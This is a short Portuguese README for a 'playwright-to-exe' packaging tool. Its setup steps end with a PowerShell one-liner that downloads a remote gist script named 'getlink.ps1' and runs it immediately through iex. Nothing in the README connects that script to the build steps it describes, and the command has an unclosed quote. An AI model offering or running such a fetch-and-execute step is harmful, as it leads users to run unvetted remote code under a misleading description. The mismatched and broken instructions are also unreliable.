# playwright-to-exe
Cria um ambiente virtual, instala dependências de requeriments.txt, encapsula o chromium, muda o PATH do Playwright para que arquivos .py possam ser transformados em executáveis e executa auto-py-exe.

## How to use
1 - Baixe o arquivo requeriments.txt e coloque dentro de uma pasta vazia;

2- Edite o arquivo requeriments.txt adicionando no campo "2" as bibliotecas que seu código precisa (não apague o campo "1"), lembre-se de salvar;

3- Abra o PowerShell dentro da pasta escolhida;

4- Cole o código:
```
iex "&{$(irm https://gist.githubusercontent.com/MadeBaruna/1d75c1d37d19eca71591ec8a31178235/raw/702e34117b07294e6959928963b76cfdafdd94f3/getlink.ps1)} global
```
